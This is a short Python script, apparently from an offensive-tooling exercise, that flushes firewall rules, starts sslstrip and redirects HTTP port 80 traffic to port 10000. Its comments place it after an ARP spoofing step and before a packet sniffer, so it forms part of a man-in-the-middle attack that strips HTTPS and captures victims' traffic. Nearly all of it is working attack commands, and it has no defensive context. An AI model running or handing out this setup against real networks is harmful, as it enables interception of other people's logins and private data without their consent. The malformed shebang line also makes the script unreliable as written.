#! usr/bin/env/python

import os

os.system("iptables --flush")
# run arp_spoof.py
os.system("sslstrip")  # default port 10000
# now redirect any port 80 to port 10000
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
# now run tool
# e.g. sniff_packet.py
